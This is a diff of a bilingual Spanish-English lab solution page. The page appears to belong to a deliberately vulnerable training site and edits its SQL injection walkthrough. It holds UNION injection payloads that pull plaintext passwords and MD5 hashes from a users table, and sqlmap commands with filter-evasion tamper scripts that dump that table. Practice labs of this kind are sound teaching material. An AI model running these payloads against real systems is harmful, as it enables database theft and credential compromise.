@@ -48,17 +48,16 @@
       <li>Extrae la tabla de usuarios con UNION (Easy):
         <pre>' UNION SELECT 1,username,password_plain,4,5 FROM users--</pre></li>
       <li>Extrae hashes (Easy): <code>' UNION SELECT 1,username,password_md5,4,5 FROM users--</code></li>
-      <li><strong>Medium:</strong> Bloquea <code>union, select, drop, insert, update, delete, --</code> en minúsculas. Bypass con mayúsculas:
-        <pre>' UniOn SeLeCt 1,username,password_plain,4,5 FROM users--</pre>
-        Nota: el filtro usa <code>.lower()</code> así que las mayúsculas NO funcionan. Usa sqlmap con tamper scripts:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=test" --dbs --batch --tamper=between</pre></li>
+      <li><strong>Medium:</strong> Bloquea <code>union, select, drop, insert, update, delete, --</code> en minúsculas. El filtro usa <code>.lower()</code> así que las mayúsculas tampoco funcionan. Usa sqlmap con tamper scripts:
+        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch --tamper=between</pre></li>
       <li><strong>Hard:</strong> WAF con regex <code>\bunion\b</code>, <code>\bselect\b</code>, <code>[';]</code>, <code>--</code>. La inyección directa está bloqueada. Usa sqlmap con tamper scripts para intentar bypasses avanzados:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=test" --dbs --batch \
+        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch \
   --tamper=between,randomcase,space2comment --level=5 --risk=3</pre></li>
       <li>Automatización completa con sqlmap (Easy):
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=test" --dbs --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=test" -D main --tables --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=test" -D main -T users --dump --batch</pre></li>
+        <pre># Usa un valor que coincida con un producto (Kali, Burp, Flipper, etc.)
+sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch
+sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main --tables --batch
+sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main -T users --dump --batch</pre></li>
       <li>Con Burp Suite: intercepta el GET, envía al Repeater y modifica el parámetro <code>q</code>.</li>
     </ol>
     <h3>Herramientas</h3>
@@ -72,15 +71,16 @@ sqlmap -u "http://TARGET_IP/sqli/search?q=test" -D main -T users --dump --batch<
       <li>Dump the users table with UNION (Easy):
         <pre>' UNION SELECT 1,username,password_plain,4,5 FROM users--</pre></li>
       <li>Extract hashes (Easy): <code>' UNION SELECT 1,username,password_md5,4,5 FROM users--</code></li>
-      <li><strong>Medium:</strong> Blocks <code>union, select, drop, insert, update, delete, --</code> (lowercase check). The filter uses <code>.lower()</code> so case variations don't work. Use sqlmap with tamper scripts:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=test" --dbs --batch --tamper=between</pre></li>
+      <li><strong>Medium:</strong> Blocks <code>union, select, drop, insert, update, delete, --</code> (lowercase check). The filter uses <code>.lower()</code> so case variations don't work either. Use sqlmap with tamper scripts:
+        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch --tamper=between</pre></li>
       <li><strong>Hard:</strong> WAF with regex <code>\bunion\b</code>, <code>\bselect\b</code>, <code>[';]</code>, <code>--</code>. Direct injection is blocked. Use sqlmap with tamper scripts for advanced bypasses:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=test" --dbs --batch \
+        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch \
   --tamper=between,randomcase,space2comment --level=5 --risk=3</pre></li>
       <li>Full automation with sqlmap (Easy):
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=test" --dbs --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=test" -D main --tables --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=test" -D main -T users --dump --batch</pre></li>
+        <pre># Use a value that matches a product (Kali, Burp, Flipper, etc.)
+sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch
+sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main --tables --batch
+sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main -T users --dump --batch</pre></li>
       <li>With Burp Suite: intercept the GET request, send to Repeater and modify the <code>q</code> parameter.</li>
     </ol>
     <h3>Tools</h3>
